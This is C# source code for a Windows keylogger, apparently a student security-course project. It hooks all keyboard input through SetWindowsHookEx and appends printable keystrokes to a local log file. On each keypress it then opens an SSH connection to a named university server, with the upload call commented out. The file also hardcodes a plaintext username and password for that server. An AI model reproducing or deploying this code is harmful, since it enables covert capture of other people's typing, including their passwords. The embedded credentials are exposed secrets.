﻿using System;
using System.Diagnostics;
using System.Windows.Forms;
using System.Runtime.InteropServices;
using System.IO;
using Renci.SshNet;

class InterceptKeys
{
    private const int WH_KEYBOARD_LL = 13;
    private const int WM_KEYDOWN = 0x0100;
    private static LowLevelKeyboardProc _proc = HookCallback;
    private static IntPtr _hookID = IntPtr.Zero;

    public static void Main()
    {
        _hookID = SetHook(_proc);
        Application.Run();
        UnhookWindowsHookEx(_hookID);
    }

    private static IntPtr SetHook(LowLevelKeyboardProc proc)
    {
        using (Process curProcess = Process.GetCurrentProcess())
        using (ProcessModule curModule = curProcess.MainModule)
        {
            return SetWindowsHookEx(WH_KEYBOARD_LL, proc,
                GetModuleHandle(curModule.ModuleName), 0);
        }
    }

    private delegate IntPtr LowLevelKeyboardProc(
        int nCode, IntPtr wParam, IntPtr lParam);

    private static IntPtr HookCallback( int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0 && wParam == (IntPtr)WM_KEYDOWN)
        {
            int vkCode = Marshal.ReadInt32(lParam);
            Console.WriteLine((Keys)vkCode);

            char key = Convert.ToChar(vkCode);
            writeToFile((Keys)vkCode);
        }
        return CallNextHookEx(_hookID, nCode, wParam, lParam);
    }

    private static void writeToFile(Keys p)
    { 
        char key = Convert.ToChar(p);
        if (key == 32)
            key = ' ';
        else if (key == 13)
            key = '\n';
       // else if (key == )


        if (key > 31 && key < 126)
        {
            //String name = (new KeysConverter()).ConvertToString(p);
            using (StreamWriter writer = new StreamWriter("log.txt", true))
            {
                writer.Write(key.ToString());
            }
        }

        copyFileToServer(readBytesFromFile());
    }

    private static Stream readBytesFromFile()
    {
        FileStream fileStream = new FileStream("log.txt", FileMode.Open);
        return fileStream;
    }


    private static void copyFileToServer(Stream fileStream)
    {
        string hostname = "et791.eng.utoledo.edu";
        string username = "kglosse";
        string password = "kglosseCSET3100";
        int port = 22;

        using (var client = new SshClient(hostname, username, password))
        {
            try
            {
                client.Connect(); // find the execption message
            }
            catch (Exception e)
            {
                MessageBox.Show(e.Message);
            }

          //  client.UploadFile(fileStream, "/home/kglosse/cset4850/logs/", true, null);

            
            client.Disconnect();
        }
    }

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr SetWindowsHookEx(int idHook,
        LowLevelKeyboardProc lpfn, IntPtr hMod, uint dwThreadId);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    [return: MarshalAs(UnmanagedType.Bool)]
    private static extern bool UnhookWindowsHookEx(IntPtr hhk);

    [DllImport("user32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr CallNextHookEx(IntPtr hhk, int nCode,
        IntPtr wParam, IntPtr lParam);

    [DllImport("kernel32.dll", CharSet = CharSet.Auto, SetLastError = true)]
    private static extern IntPtr GetModuleHandle(string lpModuleName);
}